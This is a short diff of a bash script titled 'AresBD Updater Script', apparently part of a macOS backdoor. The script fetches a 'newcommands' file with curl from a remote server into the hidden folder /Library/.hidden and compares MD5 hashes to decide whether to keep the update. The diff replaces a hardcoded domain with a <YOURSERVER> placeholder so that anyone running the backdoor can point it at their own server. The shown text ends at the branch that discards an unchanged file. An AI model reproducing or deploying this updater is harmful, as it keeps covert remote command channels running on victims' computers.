@@ -1,12 +1,14 @@
 #!/bin/bash
 #AresBD Updater Script by Stsosz 
-curl -o /Library/.hidden/newcommands http://atlas.stsosz.tk/newcommands
+SERVER=<YOURSERVER>
+
+curl -o /Library/.hidden/newcommands http://$SERVER/newcommands
 
 CURRENTMD5=`md5 -q /Library/.hidden/commands`
 
 NEWMD5=`md5 -q /Library/.hidden/newcommands`
 
-if [ "$CURRENTMD5" == "$NEWMD5" ]
+if [[ "$CURRENTMD5" == "$NEWMD5" ]]
 then
     
     rm -rf /Library/.hidden/newcommands
